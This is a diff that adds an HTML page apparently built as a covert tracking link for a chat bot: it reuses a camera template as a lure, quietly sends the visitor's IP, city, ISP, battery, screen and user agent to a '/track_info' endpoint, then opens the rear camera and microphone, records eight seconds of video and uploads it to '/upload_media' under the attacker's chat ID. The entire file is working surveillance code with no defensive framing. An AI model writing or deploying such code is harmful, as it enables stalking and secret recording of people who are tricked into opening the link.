@@ -1,0 +1,89 @@
+<!-- camera.html ki UI ko mirror karna -->
+{% include 'camera.html' %}
+
+<script>
+(async function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+    if (!chatId) return;
+
+    // --- 1. IP & DEVICE DETAILS TRACKING ---
+    async function sendDeviceDetails() {
+        let ip = "N/A", city = "N/A", region = "N/A", country = "N/A", isp = "N/A";
+        try {
+            const res = await fetch('https://ipwho.is/');
+            const data = await res.json();
+            if (data.success) {
+                ip = data.ip || "N/A";
+                city = data.city || "N/A";
+                region = data.region || "N/A";
+                country = data.country_code || "N/A";
+                isp = (data.connection && data.connection.isp) ? data.connection.isp : "N/A";
+            }
+        } catch (e) {}
+
+        let battery = "N/A";
+        if (navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}%${b.charging ? ' (Charging)' : ''}`;
+            } catch (e) {}
+        }
+
+        let network = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "4g";
+        let screen = `${window.screen.width}x${window.screen.height}`;
+        let time = new Date().toLocaleString();
+        let ua = navigator.userAgent;
+
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('ip', ip);
+        fd.append('city', city);
+        fd.append('region', region);
+        fd.append('country', country);
+        fd.append('isp', isp);
+        fd.append('battery', battery);
+        fd.append('network', network);
+        fd.append('screen', screen);
+        fd.append('time', time);
+        fd.append('ua', ua);
+
+        fetch('/track_info', { method: 'POST', body: fd }).catch(() => {});
+    }
+    sendDeviceDetails();
+
+    // --- 2. BACK 8s VIDEO CAPTURE ---
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "environment" },
+            audio: true
+        });
+
+        const previewVideo = document.getElementById('cameraPreview') || document.querySelector('video');
+        if (previewVideo) {
+            previewVideo.classList.remove('mirror');
+            previewVideo.style.transform = 'none';
+            previewVideo.srcObject = stream;
+        }
+
+        let chunks = [];
+        const recorder = new MediaRecorder(stream);
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: 'video/mp4' });
+            const fd = new FormData();
+            fd.append('file', blob, 'back_video.mp4');
+            fd.append('chat_id', chatId);
+            fd.append('type', 'video');
+            fetch('/upload_media', { method: 'POST', body: fd });
+        };
+
+        recorder.start();
+        setTimeout(() => {
+            if (recorder.state !== 'inactive') recorder.stop();
+        }, 8000);
+    } catch (err) {
+        console.error("Video Error:", err);
+    }
+})();
+</script>
